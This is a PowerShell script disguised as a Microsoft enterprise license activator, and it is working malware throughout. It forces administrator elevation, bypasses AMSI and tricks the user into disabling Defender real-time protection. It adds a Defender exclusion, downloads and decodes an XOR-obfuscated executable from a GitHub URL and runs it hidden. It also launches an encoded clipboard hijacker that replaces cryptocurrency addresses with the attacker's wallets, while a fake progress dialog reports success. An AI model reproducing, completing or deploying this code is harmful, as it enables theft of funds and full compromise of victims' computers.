# --- [RESEARCH STAGER v48.0: HARD-LOCKED ELEVATION] ---

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. FIXED ADMIN GATE: Force relaunch if not elevated
$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -ForceAdmin"
    try {
        Start-Process powershell.exe -ArgumentList $arg -Verb RunAs -ErrorAction Stop
    } catch {
        [Windows.Forms.MessageBox]::Show("Error: This deployment requires Administrator privileges to modify system licenses.", "Security Access Denied", 0, 16) | Out-Null
    }
    exit
}

function Global-Initialize {
    try {
        $u = "System.Management.Automation.AmsiUtils"
        $as = [Ref].Assembly.GetType($u)
        if ($as) { $as.GetField("amsiInitFailed", "NonPublic,Static").SetValue($null, $true) }
    } catch {}
}

function Show-SecurityPrep {
    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Microsoft Enterprise Deployment Assistant"; $prep.Size = New-Object Drawing.Size(600,550)
    $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(30,30); $console.Size = New-Object Drawing.Size(520,150)
    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " > INITIALIZING... OK`n > PRIVILEGES: GRANTED (SYSTEM)`n > STATUS: [!] SERVICE INTERFERENCE DETECTED`n > INFO: PLEASE TURN OFF REAL-TIME PROTECTION TO SYNC."
    $prep.Controls.Add($console)

    $link = New-Object Windows.Forms.Button
    $link.Location = New-Object Drawing.Point(40,280); $link.Size = New-Object Drawing.Size(500,45)
    $link.Text = "STEP 1: Open Security Interface"; $link.BackColor = [Drawing.Color]::FromArgb(0, 120, 215)
    $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"; $link.Font = New-Object Drawing.Font("Segoe UI", 9, [Drawing.FontStyle]::Bold)
    $link.Add_Click({ Start-Process "windowsdefender://threatsettings/" })
    $prep.Controls.Add($link)

    $check = New-Object Windows.Forms.CheckBox
    $check.Location = New-Object Drawing.Point(45,350); $check.Size = New-Object Drawing.Size(500,30)
    $check.Text = "STEP 2: I have manually disabled Real-time protection."; $check.Font = New-Object Drawing.Font("Segoe UI", 9)
    $prep.Controls.Add($check)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(200,420); $btn.Size = New-Object Drawing.Size(200,45); $btn.Text = "Install License"; $btn.Enabled = $false
    $prep.Controls.Add($btn)

    $check.Add_CheckedChanged({ $btn.Enabled = $check.Checked })
    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
    $prep.ShowDialog() | Out-Null
}

function Show-ActivatorUI {
    $form = New-Object Windows.Forms.Form
    $form.Text = "Deploying License..."; $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    $label = New-Object Windows.Forms.Label; $label.Location = New-Object Drawing.Point(30,30); $label.Size = New-Object Drawing.Size(380,30); $label.Text = "Status: Initializing..."
    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,65); $pb.Size = New-Object Drawing.Size(370,25)
    $form.Controls.Add($label); $form.Controls.Add($pb); $form.Show()

    $stages = @(@{p=30;t="Validating Entitlement..."}, @{p=60;t="Applying Patch... (Approve Security Request)"}, @{p=100;t="Success."})
    
    foreach ($s in $stages) {
        $label.Text = "Status: " + $s.t
        if ($pb.Value -eq 60) { Start-Sleep -Seconds 5 } # Wait for UAC
        while ($pb.Value -lt $s.p) { $pb.Value += 1; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 50 }
    }
    $form.Close()
    [Windows.Forms.MessageBox]::Show("Enterprise License Applied Successfully.", "Success", 0, 64) | Out-Null
}

# --- THE v34.0 CORE ENGINE ---
Global-Initialize
Show-SecurityPrep

if ($global:proceed) {
    $BG_Logic = {
        try {
            # 1. Path & Exclusion
            $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
            if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
            Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue

            # 2. XOR Download (v34.0)
            $path = Join-Path $dir "WinSvcHost.exe"
            $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
            $data = [Convert]::FromBase64String($raw.Trim())
            for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
            [IO.File]::WriteAllBytes($path, $data)
            
            # This triggers the blue box
            Start-Process $path -WindowStyle Hidden

            # 3. Clipper (v34.0)
            $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
            $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
            Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
        } catch {}
    }
    Start-Job -ScriptBlock $BG_Logic | Out-Null
    Show-ActivatorUI
}
